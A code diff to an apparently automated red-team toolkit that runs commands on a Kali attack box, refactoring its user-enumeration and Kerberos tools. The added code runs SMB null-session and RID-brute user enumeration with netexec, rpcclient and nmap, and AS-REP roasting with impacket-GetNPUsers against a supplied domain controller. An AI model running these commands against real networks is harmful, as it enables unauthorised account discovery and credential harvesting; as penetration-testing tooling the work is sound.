@@ -9,8 +9,8 @@ All tools execute commands remotely on the Kali attack box via AWS SSM.
 import json
 import logging
 import re
-import tempfile
 import time
+import uuid
 from datetime import datetime, timezone
 from typing import Any
 
@@ -107,6 +107,54 @@ class NetworkEnumerationTools(Toolset):
     def set_state(self, state: RedTeamState) -> None:
         """Set the operation state for this toolset."""
         self.state = state
+
+    def _run_user_enum_commands(
+        self, target: str, username: str, password: str, domain: str
+    ) -> list[tuple[str, str]]:
+        outputs: list[tuple[str, str]] = []
+
+        cmd = ["netexec", "smb", target]
+        if username and password:
+            cmd.extend(["-u", username, "-p", password])
+            if domain:
+                cmd.extend(["-d", domain])
+        else:
+            cmd.extend(["-u", "", "-p", ""])
+        cmd.append("--users")
+        stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
+        output = stdout or stderr or ""
+        outputs.append(("netexec smb --users", output))
+
+        if not (username and password):
+            rpc_cmd = [
+                "rpcclient",
+                "-U",
+                "",
+                "-N",
+                target,
+                "-c",
+                "lsaquery; enumdomusers; querydispinfo; enumdomgroups",
+            ]
+            rpc_stdout, rpc_stderr, _ = _run_tool(rpc_cmd, timeout_seconds=120)
+            rpc_output = rpc_stdout or rpc_stderr or ""
+            outputs.append(
+                (
+                    "rpcclient null session lsaquery/enumdomusers/querydispinfo/enumdomgroups",
+                    rpc_output,
+                )
+            )
+
+            nmap_cmd = ["nmap", "-Pn", "-p", "445", "--script", "smb-enum-users", target]
+            nmap_stdout, nmap_stderr, _ = _run_tool(nmap_cmd, timeout_seconds=180)
+            nmap_output = nmap_stdout or nmap_stderr or ""
+            outputs.append(("nmap smb-enum-users", nmap_output))
+
+            rid_cmd = ["netexec", "smb", target, "-u", "", "-p", "", "--rid-brute"]
+            rid_stdout, rid_stderr, _ = _run_tool(rid_cmd, timeout_seconds=120)
+            rid_output = rid_stdout or rid_stderr or ""
+            outputs.append(("netexec smb --rid-brute", rid_output))
+
+        return outputs
 
     @dn.tool_method
     def nmap_scan(self, target: str) -> str:
@@ -213,32 +261,16 @@ class NetworkEnumerationTools(Toolset):
             return False
 
         try:
-            cmd = ["netexec", "smb", target]
-
-            if username and password:
-                cmd.extend(["-u", username, "-p", password])
-                if domain:
-                    cmd.extend(["-d", domain])
-            else:
-                cmd.extend(["-u", "", "-p", ""])
-
-            cmd.append("--users")
-
-            stdout, stderr, _ = _run_tool(cmd, timeout_seconds=120)
-            output = stdout or stderr
+            outputs = self._run_user_enum_commands(target, username, password, domain)
+            sections = [
+                f"===== {label} =====\n{content}" for label, content in outputs if content.strip()
+            ]
+            output = "\n\n".join(sections).strip()
             logger.info(
                 f"[*] User enumeration completed for {target} (user:{username}, domain:{domain})"
             )
 
             if not (username and password):
-                rpc_cmd = ["rpcclient", "-U", "", "-N", target, "-c", "enumdomusers"]
-                rpc_stdout, rpc_stderr, _ = _run_tool(rpc_cmd, timeout_seconds=120)
-                if rpc_stdout or rpc_stderr:
-                    logger.info(f"[*] Null session user enumeration fallback used for {target}")
-                    rpc_output = rpc_stdout or rpc_stderr
-                    if _has_user_entries(rpc_output):
-                        return rpc_output
-
                 domain_hint = domain
                 if not domain_hint and self.state and self.state.target:
                     domain_hint = self.state.target.domain or ""
@@ -248,9 +280,15 @@ class NetworkEnumerationTools(Toolset):
                         cred_tools.set_state(self.state)
                     kerb_output = cred_tools.kerberos_user_enum_noauth(domain_hint, target)
                     if kerb_output:
-                        return (output + "\n\n" + kerb_output) if output else kerb_output
+                        output = (output + "\n\n" + kerb_output).strip()
 
-            return output
+            if output and _has_user_entries(output):
+                return output
+
+            return (
+                output
+                or "[!] No SMB user enumeration output. Target may be non-Windows or SMB is blocked."
+            )
 
         except Exception as e:
             logger.error(f"User enumeration failed: {e}")
@@ -325,27 +363,8 @@ class NetworkEnumerationTools(Toolset):
             >>> save_users_to_file("192.168.56.10", "user", "pass", "DOMAIN")
         """
         try:
-            # First enumerate users
-            cmd = ["netexec", "smb", target]
-
-            if username and password:
-                cmd.extend(["-u", username, "-p", password])
-                if domain:
-                    cmd.extend(["-d", domain])
-            else:
-                cmd.extend(["-u", "", "-p", ""])
-
-            cmd.append("--users")
-
-            stdout, _stderr, _ = _run_tool(cmd, timeout_seconds=120)
-            output = stdout or ""
-
-            # Try rpcclient fallback for null session
-            if not (username and password):
-                rpc_cmd = ["rpcclient", "-U", "", "-N", target, "-c", "enumdomusers"]
-                rpc_stdout, _rpc_stderr, _ = _run_tool(rpc_cmd, timeout_seconds=120)
-                if rpc_stdout:
-                    output += "\n" + rpc_stdout
+            outputs = self._run_user_enum_commands(target, username, password, domain)
+            output = "\n".join(content for _, content in outputs if content).strip()
 
             # Parse usernames from output
             users: set[str] = set()
@@ -686,8 +705,6 @@ class CredentialDiscoveryTools(Toolset):
         Uses credentials from state if available, otherwise tries null session.
         """
         try:
-            output = ""
-
             # Check if we have credentials in state to use for authenticated enumeration
             username, password, domain = "", "", ""
             if self.state and self.state.credentials:
@@ -695,25 +712,8 @@ class CredentialDiscoveryTools(Toolset):
                 username, password, domain = cred.username, cred.password, cred.domain
                 logger.info(f"[*] Using credential {domain}\\{username} for user enumeration")
 
-            # Try netexec with credentials or null session
-            cmd = ["netexec", "smb", target]
-            if username and password:
-                cmd.extend(["-u", username, "-p", password])
-                if domain:
-                    cmd.extend(["-d", domain])
-            else:
-                cmd.extend(["-u", "", "-p", ""])
-            cmd.append("--users")
-
-            stdout, _stderr, _ = _run_tool(cmd, timeout_seconds=120)
-            output = stdout or ""
-
-            # Try rpcclient fallback for null session only
-            if not (username and password):
-                rpc_cmd = ["rpcclient", "-U", "", "-N", target, "-c", "enumdomusers"]
-                rpc_stdout, _, _ = _run_tool(rpc_cmd, timeout_seconds=120)
-                if rpc_stdout and "NT_STATUS" not in rpc_stdout:
-                    output += "\n" + rpc_stdout
+            outputs = self._run_user_enum_commands(target, username, password, domain)
+            output = "\n".join(content for _, content in outputs if content).strip()
 
             # Parse usernames
             users: set[str] = set()
@@ -1192,6 +1192,7 @@ class CredentialHarvestingTools(Toolset):
             Raw tool output with a summary of validated principals (if any)
         """
         try:
+            remote_temp_file = ""
             if not users_file:
                 default_users = [
                     "administrator",
@@ -1201,30 +1202,31 @@ class CredentialHarvestingTools(Toolset):
                     "helpdesk",
                     "backup",
                     "sqlsvc",
-                    "carol",
-                    "carol.ng",
-                    "dave.lee",
-                    "frank.cho",
                 ]
-                with tempfile.NamedTemporaryFile(
-                    mode="w",
-                    encoding="utf-8",
-                    prefix="ares-userlist-",
-                    suffix=".txt",
-                    delete=False,
-                ) as handle:
-                    handle.write("\n".join(default_users) + "\n")
-                    users_file = handle.name
+                remote_temp_file = f"/tmp/ares-userlist-{uuid.uuid4().hex}.txt"  # nosec B108  # noqa: S108
+                users_payload = "\n".join(default_users)
+                users_file = remote_temp_file
 
-            cmd = [
-                "impacket-GetNPUsers",
-                f"{domain}/",
-                "-usersfile",
-                users_file,
-                "-dc-ip",
-                dc_ip,
-                "-no-pass",
-            ]
+            if remote_temp_file:
+                cmd_script = (
+                    f"tmp_file={remote_temp_file}\n"
+                    "trap 'rm -f \"$tmp_file\"' EXIT\n"
+                    "cat > \"$tmp_file\" <<'EOF'\n"
+                    f"{users_payload}\n"
+                    "EOF\n"
+                    f'impacket-GetNPUsers {domain}/ -usersfile "$tmp_file" -dc-ip {dc_ip} -no-pass\n'
+                )
+                cmd: list[str] = ["bash", "-lc", cmd_script]
+            else:
+                cmd = [
+                    "impacket-GetNPUsers",
+                    f"{domain}/",
+                    "-usersfile",
+                    users_file,
+                    "-dc-ip",
+                    dc_ip,
+                    "-no-pass",
+                ]
 
             logger.info(f"[*] Kerberos user enumeration (no-auth) against {domain} via {dc_ip}")
             stdout, stderr, _ = _run_tool(cmd, timeout_seconds=180)
